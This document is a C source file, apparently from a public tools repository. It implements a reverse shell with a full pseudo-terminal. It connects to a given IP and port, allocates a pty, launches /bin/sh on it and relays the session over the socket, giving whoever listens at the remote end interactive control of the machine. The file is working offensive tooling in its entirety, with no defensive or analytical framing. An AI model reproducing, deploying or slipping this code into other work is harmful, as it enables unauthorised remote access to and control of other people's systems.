/*
* ReversePTY.c
*
*  Coded by 1ndr4 (indra.kr@gmail.com)
*  https://github.com/indra-kr/Tools/blob/master/ReversePTY/ReversePTY.c
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <pty.h>
#include <utmp.h>
#include <linux/kdev_t.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/vfs.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>

static char linedata[1024];
char *line = linedata;

int chld_done = -1;

void sigchld(int signo)
{
	int pid = 0;
	while((pid = waitpid(-1, NULL, WNOHANG|WUNTRACED)) == -1); 
	signal(SIGCHLD, sigchld);
	chld_done++;
	return;
}

void do_join(int net, int ptmx)
{
	fd_set rfds;
	int fds[2];
	int i = 0, max = 0, n = 0;
	char buf[1024];
	
	fds[0] = net;
	fds[1] = ptmx;
	
	while(1) {
		if(chld_done != -1) goto failed;
		FD_ZERO(&rfds);
		FD_SET(fds[0], &rfds);
		FD_SET(fds[1], &rfds);
		
		max = ptmx + 1;
		
		if(select(max, &rfds, (fd_set*)0, (fd_set*)0, (struct timeval *)0) < 0) {
			if(errno == EINTR) {
				continue;
			} else {
				fprintf(stderr, "[!] Select error\n");
				goto failed;
			}
		}
		for(i = 0; i < 2; i++) {
			if(FD_ISSET(fds[i], &rfds)) break;
		}
		if((n = read(fds[i], buf, sizeof(buf) - 1)) <= 0) {
			fprintf(stderr, "[!] recv error\n");
			goto failed;
		}
		i = i ^ 0x01;
		if(write(fds[i], buf, n) != n) {
			fprintf(stderr, "[!] send error\n");
			goto failed;
		}
	} // end of while

failed:
	if(fds[i] > 0)
		close(fds[i]);
	i = i ^ 0x01;
	if(fds[i] > 0)
		close(fds[i]);
	return;
}

int main(int argc, char **argv)
{
	int s = 0, pid = 0;
	struct sockaddr_in sa;
	char *sh[] = { "/bin/sh", NULL };
	struct hostent *he = NULL;
	int wfd = 0, rfd = 0, ptsno = 0;
	char buf[1024];
	char ptsname[128];

	if(argc != 3) {
		fprintf(stdout, "Usage: %s <IP> <PORT>\n", argv[0]);
		return 0;
	}
	signal(SIGCHLD, sigchld);

	if((he = gethostbyname(argv[1])) == NULL) {
		fprintf(stderr, "[!] gethostbyname() error\n");
		return -1;
	}

	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "[!] socket() error\n");
		return -1;
	}

	memset(&sa, 0x00, sizeof(sa));
	memcpy(&sa.sin_addr, he->h_addr, he->h_length);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(atoi(argv[2]));

	if(connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
		fprintf(stderr, "[!] connect() error\n");
		close(s);
		return -1;
	}

	ptsno = 1;
	setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ptsno, sizeof(ptsno));
	ptsno = 16;
	setsockopt(s, SOL_IP, IP_TOS, &ptsno, sizeof(ptsno));

	// sysdeps/unix/sysv/linux/getpt.c
	if((wfd = open("/dev/ptmx", O_RDWR)) < 0) {
		fprintf(stderr, "[!] ptmx open error\n");
		return -1;
	}

	ptsno = 0;
	ioctl(wfd, TIOCSPTLCK, &ptsno);
	ioctl(wfd, TCGETS, &buf);
	ioctl(wfd, TIOCGPTN, &ptsno);

	snprintf(ptsname, sizeof(ptsname), "/dev/pts/%d", ptsno);
	if((rfd = open(ptsname, O_RDWR|O_NOCTTY)) < 0) {
		fprintf(stderr, "[!] file open error\n");
	}

	dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);

	pid = fork();
	switch(pid) {
	case -1:
		fprintf(stderr, "[!] fork() error\n");
		exit(-1);
		break;
	case 0: 
		close(rfd);
		close(wfd);
		close(s);
		setsid();
		ptsno = 1;
		ioctl(STDIN_FILENO, TIOCSCTTY, ptsno);
		execve(sh[0], sh, NULL);
		break;
	default:
		close(rfd);
		do_join(s, wfd);
		break;
	}
	close(wfd);
	close(rfd);
	close(s);
	exit(0);
}
